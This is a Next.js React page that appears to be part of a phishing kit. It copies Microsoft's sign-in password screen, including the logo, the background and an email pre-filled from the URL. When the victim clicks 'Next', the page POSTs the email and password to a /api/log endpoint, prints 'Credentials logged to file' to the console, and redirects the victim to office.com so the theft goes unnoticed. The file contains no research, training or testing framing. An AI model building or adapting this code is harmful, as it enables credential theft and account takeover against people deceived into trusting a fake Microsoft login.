import { useRouter } from 'next/router'
import { useState } from 'react'
import {Eye, EyeOff} from 'lucide-react'

export default function Password() {
  const router = useRouter()
  const email = router.query.email || 'user@example.com'
  const [password, setPassword] = useState('')
  const [show, setShow] = useState(false)


  const handleSignIn = async () => {
  try {
    await fetch('/api/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password })
    })

    console.log('🛑Credentials logged to file.')
    router.push('https://office.com')
  } catch (err) {
    console.error(err)
    alert('Failed to log. Check console.')
  }
}


  return (
    <div
      className="min-h-screen bg-cover bg-center flex flex-col justify-between items-center"
      style={{ backgroundImage: "url('/fluent_web.svg')" }}
    >
      <div className="flex flex-col justify-center items-center w-full flex-1 px-6">
        <div className="bg-white rounded-xl shadow-md p-8 w-full max-w-md text-gray-800">
          <div className='flex justify-center items-center'>
            <img src="/mslogo.png" alt="Microsoft" className="w-32 mb-6" />
          </div>
          <div className='flex justify-center'>
              <div className="text-center bg-gray-100 px-3 py-1 rounded-full text-sm text-gray-600 inline-block mb-2">
                {email}
              </div>
          </div>          
          <h2 className="text-center text-xl font-semibold mb-6">Enter your password</h2>
          <div className="relative mb-4">
            <input
              type={show ? "text" : "password"}
              placeholder="Password"
              className="w-full border border-gray-300 rounded-[4px] px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <span
              onClick={() => setShow(!show)}
              className="absolute right-3 top-2.5 cursor-pointer text-gray-500"
              title={show ? "Hide password" : "Show password"}
            >
              {show ? <EyeOff className="w-5 h-5" /> : <Eye className='w-5 h-5' />}
            </span>
          </div>
          <div className="text-sm mb-6">
            <a href="#" className="text-blue-600 hover:underline">Forgot your password?</a>
          </div>
          <button
            onClick={handleSignIn}
            className="w-full bg-blue-700 text-white py-2 font-semibold rounded-[4px] hover:bg-blue-800"
          >
            Next
          </button>
          <div className="text-sm mt-6 space-y-1 text-center">
            <p className='mb-5'><a href="#" className="text-blue-600 hover:underline font-medium">Other ways to sign in</a></p>
            <p className='mt-6 mb-6'><a href="#" className="text-blue-600 hover:underline font-medium">Sign in with a different Microsoft account</a></p>
          </div>
        </div>
      </div>
      <div className="text-xs text-gray-600 text-center mb-4 space-x-4">
        <a href="#" className="hover:underline">Help</a>
        <a href="#" className="hover:underline">Terms of use</a>
        <a href="#" className="hover:underline">Privacy and cookies</a>
        <p className="text-[10px] mt-1">
          Use private browsing if this is not your device. <a href="#" className="text-blue-600 hover:underline">Learn more</a>
        </p>
      </div>
    </div>
  )
}
